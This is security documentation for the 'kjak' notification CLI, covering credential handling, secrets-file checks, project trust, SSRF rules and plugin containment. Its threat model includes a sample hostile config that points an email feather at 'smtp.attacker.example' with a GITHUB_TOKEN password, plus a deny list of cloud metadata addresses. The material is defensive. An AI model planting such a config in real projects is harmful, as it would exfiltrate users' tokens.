# Credentials, trust and security

## Credentials

A feather's secret — a Slack or Discord webhook URL (the URL is the
credential), an SMTP password — is a reference resolved when a send runs:

| source | example | resolved from |
|---|---|---|
| `env` | `{ env = "KJAK_DEV_SLACK_WEBHOOK" }` | the environment variable (must be set and non-empty) |
| `keychain` | `{ keychain = { service = "kjak", account = "dev_slack" } }` | the OS keychain (below) |
| `secret` | `{ secret = "dev_slack.webhook_url" }` | a secrets file (below) |
| `literal` | `{ literal = "https://hooks.slack.com/..." }` | the file itself (deprecated) |

Exactly one source per credential; two are an error. Prefer `env`,
`keychain` or `secret`: a `literal` puts the secret in the configuration
file (kjak creates its files with mode 0600, but keeps the mode of an
existing file, and backups and repositories may copy it; `kjak send` and
`config validate` warn when a file with literals is readable by others). `kjak send` warns about literals, `kjak config validate --strict`
refuses them, and `kjak config migrate-secrets` moves them to a secrets file
([migration.md](migration.md)).

A configuration file (global or project) that holds a literal **and** that
other users can read gets a second warning, from `kjak send` and
`kjak config validate`: "keeps literal secrets and is not private", with the
reason (mode bits such as 0644, an ACL entry for someone else, another
owner; on Windows the owner and the DACL, as for a secrets file). The
secrets may already have been read: move them, make the file private and
rotate them. It names the file and the reason, never a value. It is a
warning, as the literal itself: nothing is refused and the trust of a
project does not change; `kjak config validate --strict` refuses every
literal and says when the file is not private.

A credential that does not resolve is a preflight error (exit 2): nothing is
sent to any target.

### Where secrets never appear

- Output: `feather show`, `feather list`, `config show` and `config trust`
  print the source (`env:NAME`, `keychain:service/account`,
  `literal:[REDACTED]`), never the value.
- Errors and reports: transport errors are described without the URL (Go's
  `*url.Error` quotes the URL, which is the webhook's secret), and every
  resolved secret — and its URL path and query, and the base64 forms sent
  for HTTP basic authentication and SMTP `AUTH` — is removed from every
  error and result message before it is printed, including text a provider
  echoes back verbatim (a changed case or another encoding of a secret is
  not recognized). Text kjak shortens or makes single-line (a response body, an SMTP
  reply, a plugin's message or stderr) is redacted **before** it is changed;
  the single-line form of a secret (a PEM key's line breaks as spaces) and
  its JSON-escaped forms are redacted too, and so is the part of a secret a
  cut leaves (at least its first, or last, 4 bytes). A secret shorter than 4
  bytes is not searched for.
- Configuration files are read up to 1 MiB, so an untrusted project file
  cannot exhaust memory before its trust is checked; TOML errors give the
  position, never the value. A configuration file (or the trust store) that
  is not a regular file — a FIFO, a device, a directory, or a link to one —
  is refused without being read: it is opened without blocking
  (`O_NONBLOCK`) and its type checked on the open descriptor, so a
  `.kjak.toml` FIFO cannot make kjak wait.
- Templates cannot loop: `range` and `define`/`template`/`block` are
  refused in message templates (as in http body templates), so a template
  cannot keep kjak busy without output; the output is limited to 1 MiB.
- Command lines: `feather add` takes the secret by reference, or from
  standard input (`--secret-stdin`), never as an argument.

## Secrets files

Secrets live apart from the configuration, in TOML files of their own
([configuration.md](configuration.md#77-secrets-files)):

| file | chosen | serves |
|---|---|---|
| personal | `--secrets FILE`, else `$KJAK_SECRETS` (explicit), else `<config dir>/secrets.toml` (user) | the global configuration; the project configuration for the names its trust allows |
| project | `./.kjak.secrets.toml` (current) | the project configuration only, trusted with it |

What kjak checks, and why:

- **Private files (Unix).** A secrets file must be a regular file owned by
  the effective user, with no permission bit for group or others (any of
  `0o077`); otherwise it is refused before it is parsed (exit 2). The file is
  opened first and the checks are made on the open descriptor (`fstat`), so
  a file swapped between a check and the read is not read: there is no
  separate check of the path. FIFOs and devices are refused without waiting
  (`O_NONBLOCK`). The size is limited to 1 MiB.
- **Links.** The project file is opened with `O_NOFOLLOW`: a repository
  could ship `.kjak.secrets.toml` as a symbolic link to your personal file,
  which would make your secrets look like the project's. For the same
  reason it must have a single name (no hard link: another user of the
  machine could make one in a directory you work in) and must not be the
  personal file itself (checked with the file's identity). The personal
  file may be a symbolic link (dotfiles); the file it leads to is checked. kjak does
  not check the directories above a secrets file: keep them yours.
- **ACLs.** The mode bits are not the whole story: kjak reads the access
  control list of a secrets file too, on the opened file, and refuses a file
  whose safety it cannot establish (fail closed). Each OS has its own model;
  the table below says what is and is not covered. `kjak config path` shows
  the model of the OS (`secrets checks`, `secrets_permission_model`) and,
  for a refused file, why.

| OS | what is checked (on the opened file) | protected against | not covered | verified by |
|---|---|---|---|---|
| Linux | owner = the user; no mode bit for group or others; the POSIX ACL (`system.posix_acl_access`): no named user (other than you), owning group, named group or others with any permission once limited by the mask; an ACL kjak cannot parse is refused | another local user reading the file through the mode bits or a POSIX ACL entry; a hard link or symbolic link as the project file | NFSv4 ACLs (`system.nfs4_acl`), SELinux/AppArmor labels, root, a file system that ignores the mode (some FUSE/CIFS mounts are refused only if they report the bits) | real files in CI (ubuntu; the ACL written with `setxattr`) |
| macOS | owner = the user; no mode bit for group or others; the ACL (`ls -le`), read without cgo by `fgetattrlist(ATTR_CMN_EXTENDED_SECURITY)`: **no allow entry** that grants more than reading attributes or the ACL, **whoever it names** (kjak cannot map an entry's GUID to a user without the directory services, so an entry for yourself is refused too: remove it with `chmod -N`); deny entries are ignored; inherited entries count as explicit ones | another user reading the file through the mode bits or an ACL entry (`chmod +a "everyone allow read"`), explicit or inherited | root, admin users with Full Disk Access, Time Machine/backups, iCloud sync of the directory | real files in CI (macos-latest) and locally, ACLs set with `chmod +a` |
| Windows | a disk file, not a reparse point (project file: opened with `FILE_FLAG_OPEN_REPARSE_POINT`, so a link is seen on the handle), one name only (project file); the **owner** must be you (or `Administrators` when your elevated token makes it the default owner); the **DACL**, read with `GetSecurityInfo` on the handle: every allow ACE that applies to the file (explicit or inherited; inherit-only ACEs do not apply) must give **nothing but reading attributes / the security descriptor** to anyone except you, `SYSTEM` and `Administrators`; a null DACL, an object/callback/compound allow ACE or an unknown ACE type is refused; deny ACEs are ignored (not credited) | `Everyone`, `Users`, `Authenticated Users`, another user or any group (even one you are in) reading the file; a file owned by someone else; a symbolic link, junction or hard link as the project file; replacing or writing the file while kjak reads it (opened with share mode read only); a named pipe impersonating you (`SECURITY_IDENTIFICATION`) | Administrators and SYSTEM (trusted: they can read any file through backup privileges); a file safe only thanks to a deny ACE is refused; integrity labels, EFS | real files in CI (windows-latest), ACLs changed with `icacls` and `SetNamedSecurityInfo` |

  Fixing a refused file: `chmod 600 FILE` (Unix), `chmod -N FILE` (macOS),
  `setfacl -b FILE` (Linux), `icacls FILE /inheritance:r /grant:r
  "%USERNAME%:F"` (Windows). A file kjak makes (`config migrate-secrets`)
  is created private: mode 0600, and on Windows a protected DACL of the
  user, `SYSTEM` and `Administrators`, whatever the directory passes on. A
  file under `%AppData%` is private by the profile's default ACL; a file
  under `C:\` (outside the profiles) inherits `Authenticated Users` and is
  refused until fixed as above.
- **Nothing is expanded.** A secret is used as it is: `${VAR}`,
  `{ env = ... }`, `{{...}}` in a value, in a message or in a template are
  text. A secret is never substituted into a string.
- **Errors name keys, not values.** A broken secrets file is reported by
  line, column or key; values are registered with the redactor when they are
  resolved, like any other secret.

### The trust boundary of a project

A cloned repository controls `./.kjak.toml` and `./.kjak.secrets.toml`. The
rules that keep your secrets from it:

1. The project configuration is used only once trusted, as before.
2. The project secrets file is part of that trust (its canonical path and
   SHA-256; `config trust` shows the names it defines, never the values). A
   project secrets file that appears, changes or disappears after the trust
   withdraws it, so it cannot be swapped after your review.
3. The global configuration never reads the project secrets file: a
   repository cannot redirect your own feathers by defining the names they
   use.
4. The project configuration reads your personal secrets file only for the
   names you allowed: `config trust` lists every name the project would read
   from your file and asks a separate question; `--yes` needs
   `--allow-user-secrets` for them. The allowed names are stored in the trust
   entry (`user_secrets`). Any other name is an error when it is resolved,
   even in a trusted project. kjak's own edits of a trusted project file
   (`feather add --scope project`) keep the allowed names the new content
   still uses and allow no new one.
5. `env` and `keychain` references of **every** feather of a project are
   allowed by name like the personal secrets above (`env:NAME`,
   `keychain:SERVICE/ACCOUNT` in `user_secrets`); any other is refused when
   it is resolved. Every feather type sends to a destination the project
   chooses: an http feather to its URL, an external feather to its plugin,
   an email feather to its SMTP `host` (which receives the password with
   `AUTH`), a slack or discord feather to its webhook URL. Trusting the
   content of a repository does not hand it your environment: a project
   with `type = "email"`, `host = "smtp.attacker.example"` and
   `password = { env = "GITHUB_TOKEN" }` would otherwise send the token to
   that server. Every variable a project gives a plugin (`env = [...]`) is
   allowed the same way. Before kjak v1.0.0 only the http and external
   feathers were gated: see [Migration](migration.md#project-env-and-keychain-references-need-a-grant).

An allowed name means "this project may send this secret to the
destinations it configures": review those destinations before you allow it.

### Terminal output

What `config trust` shows must be what the file says: a project file cannot
write terminal escape sequences through kjak. The free-text fields of a
feather (`host`, `user`, `from`, `to`, `subject_prefix`, `username`,
`plugin`, `path`, plugin `settings`, http `query` keys, `allow_hosts`,
`auth.username`, a keychain `service`/`account`) refuse control characters
(C0 including ESC, BEL, tab and line breaks; DEL; C1). Values are printed
as they are when every character is printable, and quoted (Go `%q`
syntax, which also escapes bidirectional overrides) otherwise; plugin
settings and http headers are always quoted. Unknown keys are quoted in
errors, every error is printed with its control characters escaped, and a
template's text keeps only its line breaks and tabs.

## OS keychain

kjak **reads** the keychain; it never writes it. The tools that would write
an entry without cgo take the secret as a command-line argument, visible to
other processes, so creating the entry is left to you.

| OS | backend | create an entry |
|---|---|---|
| macOS | `/usr/bin/security` (login keychain) | `security add-generic-password -s kjak -a dev_slack -w` (prompts for the secret; do not put it on the command line) |
| Linux | `secret-tool` (libsecret: GNOME Keyring, KWallet via Secret Service) | `secret-tool store --label "kjak dev_slack" service kjak account dev_slack` (reads the secret from standard input) |
| Windows | **not supported** | use `env` |

On Windows a `keychain` reference is a preflight error that says so: it is
never treated as an empty secret. (The Windows Credential Manager API needs
either cgo or a syscall binding kjak does not ship yet.) On Linux,
`secret-tool` must be installed (`libsecret-tools`) and a Secret Service must
run (a desktop session); headless servers should use `env`. On macOS the
first read may show a dialog asking to allow `security` access.

The `account` of a keychain reference cannot contain `/`, so that
`keychain:SERVICE/ACCOUNT` (what kjak shows, and what a project's trust
allows) names exactly one entry. kjak's tests run these tools as test
doubles; a real keychain is not used in CI. On macOS `security
find-generic-password -w` may print a value that is not plain text (a
non-ASCII or control character) as hexadecimal, which kjak would take as
the secret (not verified with a real keychain): keep keychain secrets to
printable ASCII (webhook URLs and tokens are), or use a secrets file.

The environment of kjak is trusted like your configuration: `KJAK_CONFIG`,
`KJAK_SECRETS`, `SSL_CERT_FILE`, the proxy variables and `PATH` (which finds
plugins and `secret-tool`) choose what kjak reads and runs. A tool that sets
variables from a repository when you enter it (direnv, mise, ...) hands that
choice to the repository.

## Project configuration trust

A `.kjak.toml` can name environment variables, keychain entries and the URLs
they are sent to. A cloned repository could therefore make `kjak send` send
your secrets anywhere. kjak uses a project file only after you trust that
exact file:

```sh
kjak config trust
```

```
project configuration /home/me/src/app/.kjak.toml
sha256 3f1c...e9
  feather app_slack: slack, webhook URL from env:APP_SLACK_WEBHOOK
  group app: app_slack
Trust this exact content? [y/N]
```

- The trust is the file's **canonical path** (absolute, symbolic links
  resolved) and the **SHA-256 of its content**, stored in
  `$XDG_CONFIG_HOME/kjak/trust.toml`. The hash trusted is the hash of the
  content that was shown.
- Any change of the content withdraws the trust; so does a different path.
- An untrusted project file is an error for every command that would use it
  (exit 2) — never used silently, never ignored silently. Pass `--no-project`
  to run without it.
- Without a terminal, `kjak config trust` requires `--yes`: review the file
  first.
- `kjak config untrust` removes the entry; `kjak config path` shows the state
  (`trusted`, `untrusted`, `untrusted (changed since it was trusted)`, or
  untrusted because of the project secrets file).
- The project secrets file and the personal secrets the project may read
  are part of the trust: see [The trust boundary of a project](#the-trust-boundary-of-a-project).
- kjak edits a project file only when it is trusted (or new), and then trusts
  the content it wrote itself.

## Transport security

- Webhooks: the URL is the credential, so it must be `https` (TLS 1.2+);
  `http` is accepted for `localhost` / loopback addresses only, and a URL with
  user information is refused — for literals when the file is read, for `env`
  and `keychain` values when they are resolved. Redirects are never followed
  (a redirected POST would carry the message elsewhere).
- E-mail: `starttls` and `tls` verify the server certificate; `starttls`
  fails if STARTTLS is not offered; a password is never sent with
  `security = "none"`. Clear-text data that arrives with the reply to
  STARTTLS (a response injection) ends the session. The text of an AUTH
  refusal is never shown (a server may repeat the encoded password); at most
  1 MiB of replies is read per session.
- HTTP feathers: see [HTTP feathers and SSRF](#http-feathers-and-ssrf).
- Certificate authorities: see
  [Certificate authorities](#certificate-authorities-ssl_cert_file-ssl_cert_dir).
- Message content: Slack text is escaped and Discord mentions are disabled,
  so a message cannot ping `@channel`/`@everyone`; a title cannot contain a
  line break (it becomes an e-mail header).

### Certificate authorities (SSL_CERT_FILE, SSL_CERT_DIR)

kjak has no CA setting of its own and no option to skip verification: the
webhook feathers (slack, discord), the http feathers and email
(`starttls`, `tls`) verify certificates with the system's roots as Go 1.27
(go.mod) loads them, and that is where `SSL_CERT_FILE` and `SSL_CERT_DIR`
come in. Whoever sets them in kjak's environment decides which certificate
authorities kjak trusts — for every feather of the send, global or project.
A project configuration cannot set them.

| | neither set | `SSL_CERT_FILE` set | `SSL_CERT_DIR` set |
|---|---|---|---|
| macOS, Windows | the platform verifier (Keychain, Windows certificate store, with their policies and the roots an administrator installed) | **only** the certificates of the file (and of `SSL_CERT_DIR` if set): the platform verifier is not used | **only** the certificates of the directories (and of `SSL_CERT_FILE` if set) |
| Linux, BSD | the distribution's bundle file and directories (`/etc/ssl/certs`, …) | the file **instead of the bundle file**; the default directories are still read | the directories **instead of the default ones**; the default bundle file is still read |

- On macOS and Windows this is new in Go 1.27 (kjak 1.x is built with it):
  earlier builds ignored the variables there. A variable set for another
  tool (curl, OpenSSL, Python) with a single corporate or test CA makes
  kjak trust that CA **only**: public endpoints such as `hooks.slack.com`
  then fail with `TLS certificate verification failed`. Point it at a full
  bundle (the CA appended to one), or unset it for kjak.
  `GODEBUG=x509sslcertoverrideplatform=0` restores the platform verifier.
- A file that does not exist trusts nothing on macOS and Windows (every
  TLS feather fails). A path that exists but cannot be read as a file (a
  directory, no permission) is not an error: on macOS and Windows the
  platform verifier is then used, as if the variable were unset.
- On Linux, `SSL_CERT_FILE` alone adds trust rather than restricting it
  (the default directories remain); restricting it takes both variables.
- An external plugin does not get the variables: they are not in its
  environment unless the feather lists them in `env`.

Verified with the kjak binary (`TestBinarySSLCertFile`, on Linux, macOS and
Windows in CI: a webhook, an http and an email feather to servers whose
certificate a test CA issued — refused without the variables, delivered
with either, refused with a missing file) and, for the platform verifier,
with a handshake to a public host on macOS and Linux (Go 1.27.3).

## HTTP feathers and SSRF

An `http` feather sends to a URL of the configuration, a trusted project's
included. Without limits, that would let a configuration reach what only
this machine can reach: its own services, the cloud metadata endpoint
(which hands out credentials), the private network. kjak's rules
([http.md](http.md#the-address-policy-ssrf)):

- `https` only, unless `allow_http = true`; no user information in a URL
  (refused, never sent); TLS 1.2 or later, certificates verified, no option
  to skip that.
- Every connection — redirects included — goes through one dialer: the host
  is resolved once, every address is classified, and the connection is made
  to a checked address (no second lookup: DNS rebinding cannot swap the
  address after the check); the socket's address is checked again before
  `connect(2)`; only TCP (no Unix socket).
- Refused by default: loopback, link-local, private networks (RFC 1918,
  CGNAT, ULA, ...), IPv6 transition addresses (NAT64, 6to4, Teredo,
  classified by the IPv4 address they carry), IPv4-mapped forms of all of
  them. `allow_networks` (CIDR) allows them explicitly; `allow_hosts` allows
  private addresses for named hosts. **Never** allowed: the cloud metadata
  addresses (169.254.169.254, fd00:ec2::254, fd20:ce::254, 169.254.170.2,
  100.100.100.200, 192.0.0.192, 168.63.129.16 (Azure WireServer),
  169.254.0.23 (Tencent)), in any IPv6 form that carries them (a local-use
  NAT64 address, 64:ff9b:1::/48, is read at every place RFC 6052 allows),
  unspecified, multicast, broadcast and reserved addresses.
- Proxy environment variables are ignored by http feathers (the guard would
  see the proxy's address, not the destination's); an http feather cannot
  use a proxy.
- Redirects are not followed unless `max_redirects` allows them; then each
  is checked like the URL — a redirect from https to http is followed only
  when the feather has `allow_http = true` (without it, never) — and `Authorization`,
  `Cookie` and the `[auth]` header are dropped as soon as the scheme, host
  or port changes; no `Referer` is ever sent.
- Secrets go only where `[auth]` puts them: never in a query, never in a
  static header, never in a template. Tokens, passwords, the encoded basic
  credentials, header values and a secret URL (with its path and query) are
  redacted from errors and reports, including a response that echoes them.
- The request body of a JSON template is built by encoding: a message
  cannot add keys or break out of a string (template injection). A message
  is never parsed as a template.
- `config trust` shows a project's http feathers with their method, URL or
  its source, authentication source and every `allow_*`/redirect setting.

Limits: a host name allowed with `allow_hosts` is trusted for every private
address its DNS returns. The guard cannot see through an HTTP proxy, which
is why none is used. Responses are read up to `max_response_bytes`.

### A project's slack, discord and email feathers

A project chooses the webhook URL of its slack and discord feathers and the
SMTP host of its email feathers as freely as the URL of an http feather.
Their connections go through the same guard (same address categories, same
`allow_networks` / `allow_hosts`, metadata never), and `config trust` shows
the host of a literal webhook URL and the address policy of each. They use
no proxy: with `HTTPS_PROXY` set, a project's webhook feather still connects
directly (the guard cannot check a destination behind a proxy); if your
network only reaches the internet through a proxy, define that feather in
your global file. A refused destination is the error code `blocked`, not
retried.

Your global file's feathers are not restricted: their destinations are
yours, local relays and private SMTP servers are common there, and they keep
the proxy environment variables. Moving a feather to the global file is
the explicit way to give it the network access of your own configuration.

## External plugins

A plugin (`type = "external"`) is an executable that runs with the user's
rights: it can do whatever the user can. kjak cannot make a plugin safe; it
controls which executable runs and what it is given ([plugins.md](plugins.md)):

- **Discovery is not authorization.** A `kjak-feather-*` on `PATH` runs only
  for a feather that names it; `kjak feather plugins` runs nothing. A plugin
  name is lower-case ASCII and never a built-in type: `type = "slack"` is
  always the built-in feather.
- **PATH hijack.** Only absolute `PATH` directories are searched (an empty
  element — the current directory — or a relative one is skipped). A name in
  two directories as different files is an error unless `path` pins one. A
  refused candidate is an error, never skipped for a later one.
- **The file.** A regular, executable file (symbolic links resolved) of root
  or the user, not writable by group or others; the `PATH` directory that
  holds the name and the directory of the real file owned by root or the
  user and not writable by group or others; every directory above them owned
  by root or the user and writable by others only when sticky; a `PATH`
  entry that is a link owned by root or the user. FIFOs are refused without
  waiting. Its identity (device, inode, size, mtime) and
  SHA-256 are recorded when the feather is built and the identity is checked
  again before every run; the SHA-256 too when it is pinned (`sha256`, or a
  project's trust). **TOCTOU limit:** the file is executed by path after the
  check; replacing it in between needs write access the checks keep to root
  and the user (for a plugin installed by Homebrew, also to the other admin
  users: below). The ACLs are checked as well (macOS, Linux: no ACL entry
  that lets anyone else change the file or its directories, nor remove or
  replace an entry of a directory above them; Windows: the file, its
  directories and every directory above them must be owned by you,
  `SYSTEM`, `Administrators` or `TrustedInstaller`, and no other principal
  may change the file or what its directories hold — in a directory above,
  adding new entries is allowed, as `Users` may on `C:\`).
- **Homebrew (macOS).** Homebrew makes `<prefix>/bin`, `Cellar` and `opt`
  writable by the `admin` group (mode 775), so a plugin installed with `brew`
  fails the checks above. kjak does **not** treat `admin` as root: unlike
  `sudo`, writing there needs no authentication and leaves no record, so
  another admin user could replace the link in `bin` or the keg under
  `Cellar`. Such a plugin runs only when **its content is the one you
  stated**: a feather of the global configuration whose `sha256` equals the
  file's SHA-256, or a feather of a trusted project whose trust records that
  resolved path and that SHA-256 (the project's own `sha256` is not enough).
  The exception covers only the group-write rule, only for `bin` (holding
  the name `<prefix>/bin/kjak-feather-*`), `Cellar` and `opt` of
  `/opt/homebrew` and `/usr/local`, each a real directory (not a link) owned
  by you (not root), of group `admin`, not writable by others, without
  setuid/setgid, with the ACL checks unchanged, and only for a file in a keg
  named for the plugin (`<prefix>/Cellar/<formula>/<version>/bin/kjak-feather-<name>`,
  whose directories and the file keep every check). The strict checks run
  first; a plugin anywhere else is checked exactly as without the
  exception. `kjak feather plugins` never reports it as `ok`: it shows the
  SHA-256 to pin.
  - **What the SHA-256 covers.** The plugin's own file, not what it loads. A
    script's interpreter (`<prefix>/bin/python3`) or a library of the prefix
    (`<prefix>/opt/<dep>/lib/*.dylib`) is in the same admin-writable
    directories and would run whatever another admin user put there. So the
    exception takes only a Mach-O executable whose every library is the
    system's (`/usr/lib/`, `/System/Library/`), without a run path or a dyld
    environment, read from the hashed file; a script, or a program that
    needs a library of Homebrew, is refused there (install it in a directory
    of your own). This covers what the executable names in its load
    commands, not what it does once it runs: a library it opens itself
    (`dlopen`), a program it starts through `PATH` (which may hold
    `<prefix>/bin`) or a file it reads from `<prefix>/share` or `etc` is the
    plugin's own business, as for any plugin.
  - **Pin what you meant to install.** `kjak feather plugins` and `kjak
    config trust` hash the file there now. Another admin user cannot plant a
    file that is yours, but can rename your kegs (for example point `bin` at
    an older version still in the Cellar). Compare the SHA-256 with what you
    expect (the release's checksum, or `shasum -a 256` of the file you just
    installed) before pinning it.
  - **Residual TOCTOU risk.** kjak checks the plugin when the feather is
    built, again before the request is prepared, and once more just before
    it starts the process: that the name still leads to the same file, the
    file's identity and SHA-256, and its place. Between that last check and
    the exec (the fork, microseconds to milliseconds), another member of
    `admin` (not only root and you) could rename the keg or the link and
    have their own program run with your rights and your request, secrets
    included. kjak executes by path (macOS has no `fexecve`). Running a
    private, hashed copy instead would close the window for the file itself;
    kjak does not do it, because macOS scans every new copy of an executable
    on its first run (seconds under load, counted in the plugin's timeout)
    and a copy breaks a plugin's relative paths. On a Mac where you are the
    only admin user, nobody else can win this race.
  - Linux (Linuxbrew included) and Windows have no exception.
- **Projects.** `config trust` records each plugin's resolved path and
  SHA-256; another or a changed executable makes the project untrusted. The
  trust shows the secrets, environment variables and settings the project
  gives a plugin.
- **What a plugin gets.** One JSON request on stdin: the message, the
  settings, and only the secrets of its `secrets` table. No arguments; an
  allow-listed environment (`PATH`, `HOME`, `TMPDIR`, locale, `TZ`, Windows'
  `SYSTEMROOT`/`USERPROFILE`, and the names in `env`; never `KJAK_*`,
  `LD_*`, `DYLD_*`, nor the variable a secret of the feather comes from);
  the temporary directory as working directory. No secret is put in the
  environment or the arguments.
- **What kjak takes back.** At most 1 MiB of stdout (more: protocol error)
  and 64 KiB of stderr; the text that reaches a report is cleaned of control
  characters, shortened, and redacted of every secret kjak resolved.
- **Lifetime.** A timeout (default 10s), the send's deadline and SIGINT,
  SIGTERM or SIGHUP kill the plugin — on Unix its whole process group
  (`Setpgid`), also after it exits; on Windows its whole Job Object (see
  below). The plugin runs in a new private directory made for the attempt,
  with only the absolute directories of `PATH`.
- **Acceptance.** A plugin that ran and then failed, crashed, timed out or
  answered wrong has acceptance `unknown` and is never retried; plugins are
  run once per send unless `retry.policy = "plugin"`.

### Plugin processes and files, per OS

| OS | containment of the plugin's processes | the plugin's file and directories | verified by |
|---|---|---|---|
| Linux | its own process group (`Setpgid`, set by the child before the exec: no window outside the group); `SIGKILL` to the group at a timeout, the deadline, SIGINT, and once the plugin exited | owner root or you; mode bits; POSIX ACL (no write for anyone else, after the mask) | CI (ubuntu): child and grandchild killed after a timeout, a cancel, a crash and a normal exit; concurrent plugins |
| macOS | as Linux | owner root or you; mode bits; ACL (no allow entry that grants a write, delete or ACL right, whoever it names) | CI (macos-latest) and locally, as Linux, ACLs set with `chmod +a` |
| Windows | a Job Object per run with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE` and no breakaway right. `os/exec` cannot create a process in a job (`SysProcAttr` has no `PROC_THREAD_ATTRIBUTE_JOB_LIST`), so the plugin is created **suspended** (`CREATE_SUSPENDED`), assigned to the job, then resumed: it runs no instruction outside the job; if the assignment fails it is killed, never run. The job is terminated at a timeout, the deadline, Ctrl+C and once the plugin exited, and its handle closed (a crash of kjak closes it too, which kills the tree) | owner you, SYSTEM, Administrators or TrustedInstaller; DACL of the file and its directories (no change by anyone else), of every directory above (no delete-child, delete, DACL or owner change) | CI (windows-latest): child and grandchild killed in every case above, `CREATE_BREAKAWAY_FROM_JOB` refused, no handle leak over 20 runs; ACLs changed with `icacls` |

Not covered: on Unix, if kjak itself is killed with SIGKILL (or crashes),
the plugin's group is not killed: it runs until it ends by itself (on
Windows the Job Object ends it when kjak's handle closes). A descendant that
leaves the group (`setsid`, `setpgid`) or a process started for the plugin
by another service (`launchd`, `systemd --user`, `at`) survives; after the plugin was reaped,
the final kill of an empty group could in principle reach a new group that
reused the id (pids are allocated in sequence; not seen in practice). On
Windows, a process started on the plugin's behalf by a service (the task
scheduler, WMI, a COM server) is not in the job. In every case a plugin runs
with your rights and can do anything you can; containment only keeps it
from outliving its run.

## Reporting a vulnerability

Please report security issues privately through GitHub's "Report a
vulnerability" (Security advisories) of magicdrive/kjak, not in a public
issue.
